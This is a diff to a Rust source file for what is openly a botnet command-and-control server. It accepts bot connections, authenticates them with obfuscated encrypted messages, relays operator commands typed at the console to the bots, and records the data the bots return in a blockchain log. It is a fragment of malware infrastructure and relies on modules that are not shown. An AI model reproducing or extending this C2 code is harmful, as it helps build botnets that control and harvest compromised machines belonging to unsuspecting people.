@@ -15,28 +15,33 @@ use std::{
     slice,
     net::SocketAddr,
     process::Command,
-    ptr::slice_from_raw_parts,
-    str::{EscapeDebug, from_utf8},
+    str::{from_utf8},
     thread,
     net,
     future,
     error::Error,
     sync::mpsc,
     future::Future,
-    thread::JoinHandle
 };
+use std::ops::{Deref, DerefMut};
 use serde::{Deserialize, Serialize};
 use rmp_serde::{Deserializer, Serializer};
 use base32;
+use std::sync::{Arc, Mutex};
 use crate::{
     encoder,
-    communication::c2::{Bot, Device_stream},
-    communication::lib,
     encryption as enc,
     message as msg,
-    blockchain::blockchain
+    communication::{
+        c2::{Bot, Device_stream},
+        lib
+    },
+    blockchain::{
+        blockchain,
+        block::{Block, BlockData, BlockHeader},
+        blockchain::Blockchain
+    }
 };
-use crate::blockchain::block::Block;
 use super::c2;
 
 const HQ: &str = "127.0.0.1:6969";
@@ -82,6 +87,7 @@ async fn authenticate_new_user(socket: &tokio::net::TcpStream, addr: SocketAddr)
     let data = handle_message_received(&mut DS, socket).await;
     if DS.connected {
         let encryption_key = msg::c2_bot_data_processing::deobfuscate_data(data, false, &DS.encryption_key);
+        DS.authenticated = true;
         DS.B = msg::c2_bot_data_processing::deserialize_rmp(encryption_key);
         DS.encryption_key = DS.B.com.data.clone();
     }
@@ -137,7 +143,7 @@ async fn handle_message_from_client(
 
 fn client_input (
     c2_tx: Sender<Vec<u8>>,
-) {
+) -> io::Result<()> {
     loop {
         println!("-> ");
         let mut buff = String::new();
@@ -147,19 +153,30 @@ fn client_input (
         buff.pop();
         c2_tx.send(buff.into_bytes()).unwrap(); // edode : Data has to be sent to the bots
     }
+    Ok(())
 }
 
 /// Receiving the data from the bot and sending it to the HQ
 async fn receive_bot_data(
     mut bot_rx: Receiver<c2::Device_stream>,
-) {
+    mut M_Blk: Arc<Mutex<Blockchain>>,
+) -> io::Result<()> {
+    let mut BH: BlockHeader = BlockHeader::new();
+    let mut BD: BlockData = BlockData::new();
     loop {
         match bot_rx.try_recv() {
             Ok(mut received_data) => {
-                println!("Received data from channel : {:?} from : {:?}", received_data.B, received_data.ip_address);
-                println!("Sending Data to Commanding C2");
-                // edode : writing to blockchain
 
+                println!("Received data from channel : {:?} from : {:?}", received_data.B, received_data.ip_address);
+
+                if let Ok(mut Blk) = M_Blk.lock() {
+                    BH.create_block_header(Blk.get_last_block_hash());
+                    BD.create_block_data(received_data);
+                    Blk.add_block(Block::new(BH.clone(), BD.clone()));
+                    println!("Block added to the blockchain");
+                    // print the blockchain
+                    println!("{:?}", Blk);
+                }
             },
             Err(err) => {
                 // edode : empty channel
@@ -167,6 +184,7 @@ async fn receive_bot_data(
             },
         };
     }
+    Ok(())
 }
 
 #[tokio::main]
@@ -179,16 +197,17 @@ pub async fn main() -> Result<(), Box<dyn Error>> {
     let mut Co: c2::Cohort = c2::Cohort::new();
     let mut Blk: blockchain::Blockchain = blockchain::Blockchain::new();
     // lisandro : make this more generic
-    let x = chn_c2_tx.clone();
+    let c2_input_rx = chn_c2_tx.clone();
     thread::spawn(move || {
-        client_input(x);
+        client_input(c2_input_rx);
     });
+    let Blk_arc  = Arc::new(Mutex::new(Blk));
 
     println!("C2 Server Initialized");
     loop {
         // edode : Accepting the new bot
         let (socket, addr) = listener.accept().await?;
-
+        let mut Blk_arc_c = Blk_arc.clone();
         println!("New user connected: {}", addr);
 
         Co.append_C2_Stream(authenticate_new_user(&socket, addr).await);
@@ -210,7 +229,7 @@ pub async fn main() -> Result<(), Box<dyn Error>> {
         });
 
         tokio::spawn(async move {
-            receive_bot_data(bot_rx).await;
+            receive_bot_data(bot_rx, Blk_arc_c).await;
         });
     }
     Ok(())
